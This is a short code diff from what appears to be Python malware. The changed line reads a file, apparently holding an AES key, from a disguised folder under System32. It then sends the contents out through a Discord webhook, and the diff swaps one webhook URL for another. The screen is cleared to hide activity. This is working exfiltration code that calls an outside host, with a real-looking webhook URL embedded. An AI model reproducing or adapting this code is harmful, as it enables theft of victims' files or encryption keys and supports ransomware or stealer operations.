@@ -15,7 +15,7 @@ os.system('cls')
 file_pathkeyx = r"C:\Windows\System32\xsystem\xaes.txt"
 with open(file_pathkeyx, 'r') as file:
     contentxsf = file.read()
-send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", contentxsf)
+send_dx("https://discordapp.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM", contentxsf)
 os.system('cls')
 file_pathmybootaes = r"C:\myaesboot.txt"
 if os.path.exists(file_pathmybootaes):
